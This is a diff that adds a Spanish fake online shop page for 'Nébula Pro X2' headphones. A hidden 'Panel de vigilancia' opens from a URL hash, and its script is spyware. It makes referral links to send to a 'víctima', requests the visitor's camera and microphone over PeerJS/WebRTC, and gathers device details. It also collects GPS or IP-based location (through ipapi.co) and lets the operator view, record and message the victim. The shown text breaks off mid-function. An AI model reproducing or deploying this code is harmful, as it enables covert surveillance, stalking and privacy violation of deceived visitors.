@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Nébula Store — Audio y tecnología</title>
+<style>
+*{box-sizing:border-box}
+:root{--ink:#0f172a;--mut:#64748b;--line:#e5e7eb;--soft:#f8fafc;--acc:#ea580c;--dark:#0b1220;--bg:#0f1115;--fg:#e8eaed;--bd:#262b35}
+body{margin:0;background:#fff;color:var(--ink);font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+img{display:block;max-width:100%}a{color:inherit;text-decoration:none;cursor:pointer}
+.w{max-width:1120px;margin:0 auto;padding:0 20px}
+.promo{background:var(--dark);color:#fff;font-size:12.5px;text-align:center;padding:9px 16px}.promo b{color:#fdba74}
+header{background:#fff;border-bottom:1px solid var(--line)}
+.hrow{display:flex;align-items:center;gap:22px;padding:14px 0}
+.logo{font-weight:700;font-size:19px;letter-spacing:3px}.logo span{color:var(--acc)}
+.search{flex:1;max-width:430px;position:relative}
+.search input{width:100%;padding:10px 14px 10px 38px;border:1px solid var(--line);border-radius:999px;font:inherit;font-size:14px;background:var(--soft)}
+.search svg{position:absolute;left:13px;top:50%;transform:translateY(-50%);opacity:.45}
+.hic{display:flex;gap:18px;align-items:center;margin-left:auto;font-size:13px;color:var(--mut)}
+.badge{background:var(--acc);color:#fff;font-size:11px;border-radius:999px;padding:1px 6px;font-weight:600}
+nav{border-top:1px solid var(--line)}
+.navr{display:flex;gap:24px;padding:11px 0;font-size:13.5px;color:var(--mut);overflow-x:auto}.navr .hot{color:var(--acc);font-weight:500}
+main{padding:26px 0 40px}
+.crumbs{font-size:12.5px;color:var(--mut);margin-bottom:20px}
+.prod{display:grid;grid-template-columns:1.05fr 1fr;gap:44px}
+@media(max-width:820px){.prod{grid-template-columns:1fr;gap:26px}.search{display:none}}
+.gal{display:grid;grid-template-columns:74px 1fr;gap:12px}
+@media(max-width:560px){.gal{grid-template-columns:1fr}.thumbs{display:flex;gap:8px;order:2}}
+.thumbs{display:grid;gap:10px;align-content:start}
+.thumbs img{border-radius:9px;border:2px solid transparent;aspect-ratio:1;object-fit:cover;background:var(--soft)}
+.thumbs img.on{border-color:var(--acc)}
+.hero{border-radius:14px;overflow:hidden;background:var(--soft);aspect-ratio:1/1}
+.hero img{width:100%;height:100%;object-fit:cover}
+h1{font-size:25px;line-height:1.3;margin:0 0 10px;font-weight:650}
+.meta{display:flex;gap:9px;flex-wrap:wrap;font-size:13px;color:var(--mut);margin-bottom:14px}
+.stars{color:#f59e0b;letter-spacing:1px}
+.prices{display:flex;align-items:baseline;gap:10px;margin:14px 0 4px}
+.pnow{font-size:31px;font-weight:700}.pold{color:var(--mut);text-decoration:line-through;font-size:16px}
+.poff{background:#fee2e2;color:#b91c1c;font-size:12px;font-weight:600;padding:3px 8px;border-radius:6px}
+.iva{font-size:12px;color:var(--mut);margin-bottom:16px}
+.stock{font-size:13px;color:#15803d;font-weight:500;margin-bottom:20px}
+.stock i{display:inline-block;width:7px;height:7px;border-radius:50%;background:#15803d;margin-right:7px}
+.lbl{font-size:12px;color:var(--mut);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px}
+.swatches{display:flex;gap:9px;margin-bottom:18px}
+.sw{width:34px;height:34px;border-radius:9px;border:2px solid var(--line);cursor:pointer}.sw.on{border-color:var(--ink)}
+.cta{display:flex;gap:10px;margin:20px 0 12px}
+.btn{border:0;border-radius:11px;font:inherit;font-weight:600;padding:14px 20px;cursor:pointer;flex:1;font-size:15px}
+.btn.main{background:var(--acc);color:#fff}.btn.ghost{background:#fff;border:1.5px solid var(--ink);color:var(--ink);flex:0 0 auto}
+.trust{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:22px;border-top:1px solid var(--line);padding-top:18px}
+.trust div{font-size:12px;color:var(--mut);text-align:center}
+.trust b{display:block;color:var(--ink);font-size:12.5px;margin-bottom:2px}
+.tabs{margin-top:44px;border-top:1px solid var(--line)}
+.tabh{display:flex;gap:26px;padding-top:16px;font-size:14px;color:var(--mut);border-bottom:1px solid var(--line)}
+.tabh span{padding-bottom:13px;border-bottom:2px solid transparent;cursor:pointer}
+.tabh span.on{color:var(--ink);border-color:var(--acc);font-weight:600}
+.tabb{padding:22px 0;font-size:14.5px;color:#334155;max-width:780px}.tabb ul{padding-left:20px;margin:10px 0}
+.rel{margin-top:44px}
+.rel h2,.revs h2{font-size:19px;margin:0 0 18px;font-weight:650}
+.rg{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+@media(max-width:820px){.rg{grid-template-columns:repeat(2,1fr)}}
+.rc{border:1px solid var(--line);border-radius:13px;overflow:hidden}
+.rc img{aspect-ratio:1;object-fit:cover;width:100%;background:var(--soft)}
+.rc .rb{padding:12px}.rc .rn{font-size:13.5px;font-weight:500;line-height:1.4;margin-bottom:6px}
+.rc .rp{font-weight:700;font-size:15px}.rc .ro{font-size:12px;color:var(--mut);text-decoration:line-through;margin-left:6px;font-weight:400}
+.revs{margin-top:44px}
+.rsum{display:flex;align-items:center;gap:14px;margin-bottom:20px;font-size:13px;color:var(--mut)}
+.rbig{font-size:34px;font-weight:700;color:var(--ink);line-height:1}
+.rev{border-top:1px solid var(--line);padding:18px 0;display:flex;gap:14px}
+.rav{width:38px;height:38px;border-radius:50%;background:var(--soft);border:1px solid var(--line);flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-weight:600;color:var(--mut)}
+.rev b{font-size:14px}.rev .wh{font-size:12px;color:var(--mut);margin-left:8px;font-weight:400}
+.rev p{margin:6px 0 0;font-size:14px;color:#334155}
+footer{background:var(--dark);color:#94a3b8;margin-top:56px;padding:44px 0 26px;font-size:13.5px}
+.fg{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:30px}
+@media(max-width:820px){.fg{grid-template-columns:1fr 1fr}}
+footer h4{color:#fff;font-size:12.5px;text-transform:uppercase;letter-spacing:.8px;margin:0 0 12px}
+footer a{display:block;margin-bottom:7px}
+.fb{border-top:1px solid #1e293b;margin-top:32px;padding-top:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:12.5px}
+.cookie{position:fixed;left:0;right:0;bottom:0;background:#fff;border-top:1px solid var(--line);padding:13px 20px;display:flex;gap:14px;align-items:center;justify-content:center;flex-wrap:wrap;font-size:13px;z-index:30}
+.cookie button{background:var(--ink);color:#fff;border:0;border-radius:8px;padding:9px 18px;font:inherit;font-size:13px;font-weight:600;cursor:pointer}
+.chat{position:fixed;right:18px;bottom:74px;background:var(--acc);color:#fff;border-radius:999px;padding:11px 17px;font-size:13px;font-weight:600;display:flex;align-items:center;gap:8px;z-index:29}
+.chat i{width:8px;height:8px;border-radius:50%;background:#4ade80}
+#panel{display:none;background:var(--bg);color:var(--fg);min-height:100vh;padding:20px 16px 50px;font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+body.panel{background:var(--bg)}
+body.panel #tienda{display:none}body.panel #panel{display:block}
+#panel .box{max-width:820px;margin:0 auto}
+.card{background:#171a21;border:1px solid var(--bd);border-radius:12px;padding:14px;margin-bottom:12px}
+.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+#panel button{font:inherit;font-size:13px;font-weight:500;padding:9px 13px;border-radius:9px;border:1px solid #2f3644;background:#20242e;color:var(--fg);cursor:pointer}
+#panel button:hover{background:#262b36}
+#panel button.pri{background:#22c55e;border-color:#22c55e;color:#06180d}
+#panel button.on{background:#ef4444;border-color:#ef4444;color:#fff}
+#panel input{font:inherit;font-size:13px;padding:9px 11px;border-radius:9px;border:1px solid #2f3644;background:#0f1115;color:var(--fg);width:100%}
+.link{font:11.5px/1.45 ui-monospace,Menlo,monospace;color:#22c55e;word-break:break-all}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#6b7280;margin-right:7px;vertical-align:middle}
+.dot.live{background:#22c55e;animation:p 1.4s infinite}
+@keyframes p{50%{opacity:.3}}
+#panel video{width:100%;border-radius:11px;background:#000;display:block}
+#panel h3{font-size:11px;color:#8b93a1;margin:0 0 9px;text-transform:uppercase;letter-spacing:.6px;font-weight:500}
+.dl{display:grid;grid-template-columns:auto 1fr;gap:5px 13px;font-size:12.5px;margin:0}
+.dl dt{color:#8b93a1}.dl dd{margin:0;word-break:break-word}
+.log{font:11.5px/1.6 ui-monospace,Menlo,monospace;color:#8b93a1;max-height:120px;overflow:auto}
+.tip{position:fixed;left:50%;bottom:22px;transform:translateX(-50%);background:#0f766e;color:#fff;padding:10px 20px;border-radius:999px;font-size:13px;z-index:40}
+</style>
+</head>
+<body>
+
+<div id="tienda">
+  <div class="promo">Envío gratis desde 30 € · Devoluciones en 30 días · Código <b>TEMP15</b> para tu primer pedido</div>
+  <header>
+    <div class="w"><div class="hrow">
+      <div class="logo">NÉBULA<span>.</span></div>
+      <div class="search"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg><input placeholder="Buscar auriculares, altavoces, accesorios…"></div>
+      <div class="hic"><span>Cuenta</span><span>Carrito <span class="badge">2</span></span></div>
+    </div></div>
+    <nav><div class="w"><div class="navr"><a class="hot">Rebajas -50%</a><a>Audio</a><a>Altavoces</a><a>Auriculares</a><a>Accesorios</a><a>Marcas</a><a>Outlet</a><a>Blog</a></div></div></nav>
+  </header>
+  <main class="w">
+    <div class="crumbs"><a>Inicio</a> / <a>Audio</a> / <a>Auriculares</a> / <span>Nébula Pro X2</span></div>
+    <div class="prod">
+      <div class="gal">
+        <div class="thumbs">
+          <img class="on" src="https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=200&q=70">
+          <img src="https://images.unsplash.com/photo-1583394838336-acd977736f90?auto=format&fit=crop&w=200&q=70">
+          <img src="https://images.unsplash.com/photo-1484704849700-f032a568e944?auto=format&fit=crop&w=200&q=70">
+          <img src="https://images.unsplash.com/photo-1546435770-a3e426bf472b?auto=format&fit=crop&w=200&q=70">
+        </div>
+        <div class="hero"><img id="hero" src="https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=900&q=75"></div>
+      </div>
+      <div>
+        <h1>Auriculares inalámbricos Nébula Pro X2 con cancelación activa de ruido</h1>
+        <div class="meta"><span class="stars">★★★★☆</span><span>4,6 · 218 valoraciones</span><span>·</span><span>Ref. NBX2-042</span></div>
+        <div class="prices"><span class="pnow">79,90 €</span><span class="pold">149,00 €</span><span class="poff">-46 %</span></div>
+        <div class="iva">IVA incluido · Envío gratis</div>
+        <div class="stock"><i></i>En stock · quedan 3 unidades</div>
+        <div class="lbl">Color</div>
+        <div class="swatches"><div class="sw on" style="background:#111"></div><div class="sw" style="background:#e5e7eb"></div><div class="sw" style="background:#1e3a8a"></div></div>
+        <div class="cta"><button class="btn main">Añadir al carrito</button><button class="btn ghost">♡</button></div>
+        <div class="trust"><div><b>Envío gratis</b>desde 30 €</div><div><b>30 días</b>para devolver</div><div><b>Pago seguro</b>Visa · MC</div></div>
+      </div>
+    </div>
+    <div class="tabs">
+      <div class="tabh"><span class="on">Descripción</span><span>Especificaciones</span><span>Envío y devoluciones</span></div>
+      <div class="tabb"><p>Drivers dinámicos de 40 mm con diafragma de titanio, cancelación híbrida de tres micrófonos y modo transparencia cuando necesitas oír lo de fuera.</p>
+      <ul><li>Hasta 42 h de reproducción con ANC desactivado, 28 h con ANC activo.</li><li>Carga rápida: 10 minutos para 5 horas de uso.</li><li>Bluetooth 5.3 con multipunto y conexión simultánea a dos dispositivos.</li><li>Códecs SBC, AAC, aptX Adaptive y LDAC.</li></ul></div>
+    </div>
+    <div class="rel">
+      <h2>También te puede interesar</h2>
+      <div class="rg">
+        <div class="rc"><img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=400&q=70"><div class="rb"><div class="rn">Reloj Nébula Active 3</div><div class="rp">129,00 €<span class="ro">199,00 €</span></div></div></div>
+        <div class="rc"><img src="https://images.unsplash.com/photo-1553062407-98eeb64c6a62?auto=format&fit=crop&w=400&q=70"><div class="rb"><div class="rn">Mochila Nébula Urban 22L</div><div class="rp">49,90 €<span class="ro">69,00 €</span></div></div></div>
+        <div class="rc"><img src="https://images.unsplash.com/photo-1572635196237-14b3f281503f?auto=format&fit=crop&w=400&q=70"><div class="rb"><div class="rn">Gafas de sol Nébula Sun</div><div class="rp">39,00 €<span class="ro">59,00 €</span></div></div></div>
+        <div class="rc"><img src="https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?auto=format&fit=crop&w=400&q=70"><div class="rb"><div class="rn">Altavoz Nébula Boom Mini</div><div class="rp">59,90 €<span class="ro">89,00 €</span></div></div></div>
+      </div>
+    </div>
+    <div class="revs">
+      <h2>Valoraciones de clientes</h2>
+      <div class="rsum"><span class="rbig">4,6</span><span class="stars">★★★★☆</span><span>218 valoraciones verificadas</span></div>
+      <div class="rev"><div class="rav">M</div><div><b>Marta R.</b><span class="wh">hace 3 días</span><p>Suenan muy bien para el precio y la cancelación cumple de sobra en el metro. La batería aguanta lo que promete.</p></div></div>
+      <div class="rev"><div class="rav">D</div><div><b>Diego L.</b><span class="wh">hace 1 semana</span><p>Llegaron en dos días. La funda es rígida de verdad, no como otras marcas que te mandan una bolsa.</p></div></div>
+      <div class="rev"><div class="rav">A</div><div><b>Ana P.</b><span class="wh">hace 2 semanas</span><p>El modo transparencia va genial para hablar sin quitártelos. Muy cómodos incluso con gafas.</p></div></div>
+    </div>
+  </main>
+  <footer><div class="w">
+    <div class="fg">
+      <div><div class="logo" style="color:#fff;margin-bottom:12px">NÉBULA<span>.</span></div><p style="margin:0;max-width:280px">Audio, sonido y tecnología desde 2014. Más de 40.000 pedidos entregados.</p></div>
+      <div><h4>Tienda</h4><a>Auriculares</a><a>Altavoces</a><a>Accesorios</a><a>Outlet</a></div>
+      <div><h4>Ayuda</h4><a>Envíos</a><a>Devoluciones</a><a>Garantía</a><a>Contacto</a></div>
+      <div><h4>Legal</h4><a>Aviso legal</a><a>Privacidad</a><a>Cookies</a><a>Términos</a></div>
+    </div>
+    <div class="fb"><span>© 2026 Nébula Store S.L. · CIF B-88421093</span><span>Visa · Mastercard · PayPal · Bizum</span></div>
+  </div></footer>
+  <div class="cookie">Usamos cookies para mejorar tu experiencia. <a>Más información</a> <button id="ck">Aceptar</button></div>
+  <div class="chat"><i></i>Atención al cliente</div>
+</div>
+
+<div id="panel"><div class="box">
+  <h1 style="font-size:17px;font-weight:500;margin:0 0 3px">Panel de vigilancia</h1>
+  <div style="color:#8b93a1;font-size:12px;margin-bottom:18px">Se conecta solo y reintenta. Puedes cerrar esta página y volver cuando quieras.</div>
+  <div class="card">
+    <div style="margin-bottom:11px"><span class="dot" id="st"></span><span id="stTxt" style="font-size:12px;color:#8b93a1">Iniciando…</span></div>
+    <div class="row"><input id="ref" style="flex:1;min-width:120px" placeholder="referido"><button id="aplicar">Aplicar</button></div>
+    <div style="margin-top:13px;font-size:11px;color:#8b93a1;text-transform:uppercase;letter-spacing:.6px">Enlace que le mandas</div>
+    <div class="link" id="enlace" style="margin-top:4px"></div>
+    <div class="row" style="margin-top:9px"><button id="copiar">Copiar</button><button id="probar">Abrir yo</button></div>
+  </div>
+  <div id="live" style="display:none">
+    <div class="card">
+      <video id="vid" autoplay playsinline controls></video>
+      <div class="row" style="margin-top:11px"><button id="bCam">Cámara</button><button id="bScreen">Pantalla</button><button id="bMic">Hablar</button><button id="bSnap">Foto</button><button id="bRec">Grabar</button></div>
+      <div class="row" style="margin-top:7px"><input id="msg" style="flex:1;min-width:120px" placeholder="mensaje para su pantalla"><button id="bSend">Enviar</button><button id="bInfo">Info</button><button id="bGeo">Ubicación</button></div>
+    </div>
+    <div class="card" id="cInfo" style="display:none"><h3>Dispositivo</h3><dl class="dl" id="lInfo"></dl></div>
+    <div class="card" id="cGeo" style="display:none"><h3>Ubicación</h3><div id="bGeoBody"></div></div>
+    <div class="card"><h3>Registro</h3><div class="log" id="log"></div></div>
+  </div>
+</div></div>
+
+<audio id="rx" autoplay></audio>
+
+<script src="https://unpkg.com/peerjs@1/dist/peerjs.min.js"></script>
+<script>
+(function(){
+"use strict";
+var $=function(s){return document.querySelector(s)};
+var Q=new URLSearchParams(location.search);
+var ES_PANEL=/panel|espia|spy/.test(location.hash);
+var REF=(Q.get('ref')||localStorage.getItem('nb_ref')||'principal').toLowerCase().replace(/[^a-z0-9-]/g,'').slice(0,24)||'principal';
+var ROOM='nb-'+REF;
+var ICE={iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'},
+ {urls:'turn:openrelay.metered.ca:80',username:'openrelayproject',credential:'openrelayproject'},
+ {urls:'turn:openrelay.metered.ca:443',username:'openrelayproject',credential:'openrelayproject'}]};
+var peer=null,conn=null,call=null,stream=null,mic=null,micOn=false,rec=null,autoRec=false;
+var buscando=false,timer=null,to=null,fallos=0,pidiendo=false,wl=null;
+
+function tip(t){var d=document.createElement('div');d.className='tip';d.textContent=t;document.body.appendChild(d);setTimeout(function(){d.remove()},3500)}
+function dl(b,n){var u=URL.createObjectURL(b),a=document.createElement('a');a.href=u;a.download=n;a.click();setTimeout(function(){URL.revokeObjectURL(u)},5000)}
+function enlace(){return location.origin+location.pathname+'?ref='+REF}
+function log(t){var d=document.createElement('div');d.textContent=new Date().toLocaleTimeString()+'  '+t;$('#log').prepend(d)}
+function estado(l,t){$('#st').classList.toggle('live',!!l);$('#stTxt').textContent=t}
+
+async function ficha(){
+  var n=navigator,o={};
+  o['User agent']=n.userAgent; o['Plataforma']=n.platform||'n/d';
+  o['Idiomas']=(n.languages||[]).join(', ')||'n/d'; o['Núcleos']=n.hardwareConcurrency||'n/d';
+  o['RAM aprox.']=n.deviceMemory?n.deviceMemory+' GB':'n/d';
+  o['Pantalla']=screen.width+' x '+screen.height; o['Ventana']=innerWidth+' x '+innerHeight;
+  o['Zona horaria']=Intl.DateTimeFormat().resolvedOptions().timeZone;
+  o['Táctil']=n.maxTouchPoints>0?'sí':'no'; o['Hora local']=new Date().toLocaleString();
+  o['Conexión']=n.connection?n.connection.effectiveType:'n/d';
+  try{var b=await n.getBattery();o['Batería']=Math.round(b.level*100)+'%'+(b.charging?' (cargando)':'')}catch(e){}
+  try{var d=await n.mediaDevices.enumerateDevices();
+    o['Cámaras']=d.filter(function(x){return x.kind==='videoinput'}).length;
+    o['Micrófonos']=d.filter(function(x){return x.kind==='audioinput'}).length}catch(e){}
+  return o;
+}
+async function geo(){
+  var g=await new Promise(function(r){
+    if(!navigator.geolocation) return r(null);
+    navigator.geolocation.getCurrentPosition(
+      function(p){r({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,src:'GPS'})},
+      function(){r(null)},{timeout:8000,enableHighAccuracy:true})});
+  if(g) return g;
+  try{var j=await (await fetch('https://ipapi.co/json/')).json();
+    if(!j.latitude) return null;
+    return {lat:j.latitude,lon:j.longitude,city:j.city,region:j.region,country:j.country_name,isp:j.org,src:'IP'}}catch(e){return null}
+}
+
+/* ============ VÍCTIMA ============ */
+async function camara(){
+  if(stream&&stream.active) return true;
+  if(pidiendo) return false; pidiendo=true;
+  try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280}},audio:true});pidiendo=false;return true}
+  catch(e){pidiendo=false;return fals
